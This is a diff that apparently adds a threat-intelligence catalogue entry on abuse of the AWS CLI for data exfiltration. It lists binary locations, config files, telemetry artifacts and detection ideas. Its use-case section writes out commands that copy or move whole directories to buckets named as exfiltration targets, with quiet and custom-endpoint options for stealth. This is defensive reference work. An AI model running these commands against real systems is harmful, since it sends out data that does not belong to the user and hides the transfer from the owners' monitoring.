@@ -1,0 +1,95 @@
+Name: AWS CLI
+Description: Official command-line tool by Amazon Web Services used to manage AWS infrastructure. Supports file transfer to S3 via cp, mv, and sync commands, and has been abused for data exfiltration by ransomware groups.
+Category: cloud-based
+Platform:
+  - Windows
+  - Linux
+  - macOS
+Execution:
+  - cli
+Capabilities:
+  - file-transfer
+  - authenticated-upload
+  - recursive-upload
+  - quiet-execution
+  - endpoint-spoofing
+  - credentialed-access
+Stealth:
+  - quiet-flag
+  - custom-endpoint
+  - anonymous-upload
+  - background-execution
+Forensics:
+  BinaryLocations:
+    - C:\Program Files\Amazon\AWSCLIV2\aws.exe
+    - C:\Program Files (x86)\Amazon\AWSCLI\bin\aws.exe
+    - USERPROFILE\AppData\Local\Programs\Python\Python39\Scripts\aws.exe
+    - /usr/local/bin/aws
+    - /usr/bin/aws
+    - ~/.local/bin/aws
+  FileNamePatterns:
+    - aws\.exe
+    - aws\.cmd
+    - aws
+  CommandLineArgs:
+    - s3 cp
+    - s3 mv
+    - s3 sync
+    - --recursive
+    - --quiet
+    - --endpoint-url
+    - --exclude
+    - --include
+  NetworkArtifacts:
+    - TLS traffic to *.s3.amazonaws.com
+    - API calls to s3-accelerate.amazonaws.com
+    - Authenticated HTTPS PUT/POST requests
+  ConfigFiles:
+    - C:\Users\<username>\.aws\credentials
+    - ~/.aws/credentials
+  ScheduledTask: []
+  RegistryPersistence: []
+Tags:
+  - cloud-based
+  - commonly-used
+  - stealth
+  - remote-execution
+ThreatActors:
+  - ransomware
+  - apt
+UseCases:
+  - Title: Standard copy to S3
+    Description: Copies a local file or directory to an S3 bucket using cp and recursive flags.
+    Command: aws s3 cp C:\Data s3://exfil-bucket/ --recursive
+
+  - Title: Silent exfiltration using quiet mode
+    Description: Executes the same copy operation but suppresses output for stealth.
+    Command: aws s3 cp /tmp/data s3://bucket-name/ --recursive --quiet
+
+  - Title: Use of custom S3 endpoint (accelerated or obfuscated)
+    Description: Uploads data using S3 Transfer Acceleration or a custom endpoint to evade detection.
+    Command: aws s3 cp data.txt https://redacted.s3-accelerate.amazonaws.com --endpoint-url
+
+  - Title: Filtered upload of specific file types
+    Description: Uploads only selected files from a directory using --include and --exclude filters.
+    Command: aws s3 cp /reports s3://leakdump/ --recursive --include "*.pdf" --exclude "*"
+
+  - Title: Move (delete after upload)
+    Description: Exfiltrates files and deletes local copies using `mv`.
+    Command: aws s3 mv C:\Sensitive s3://hidden-bucket/ --recursive
+
+Detection:
+  - Type: Anomalous Endpoint Usage
+    Description: Create a low-severity detection for AWS CLI uploads to uncommon or non-standard S3 endpoints, such as non-default regions or S3 Transfer Acceleration URLs.
+
+  - Type: Behavioral Correlation
+    Description: Correlate anomalous S3 endpoint usage with other suspicious events (e.g., privilege escalation, credential access, compression utilities) to identify multi-stage exfiltration campaigns.
+
+  - Type: Process Anomaly
+    Description: Generate alerts when the AWS CLI process is spawned by non-interpreter parents such as malware, implants, or remote management tools, indicating potential automated exfiltration.
+
+  - Type: Command-Line Abuse
+    Description: Flag the use of the `--endpoint-url` argument with suspicious hostnames or IPs outside of approved enterprise infrastructure, which may indicate redirection to attacker-controlled storage.
+
+LastModified: 2025-10-20
+
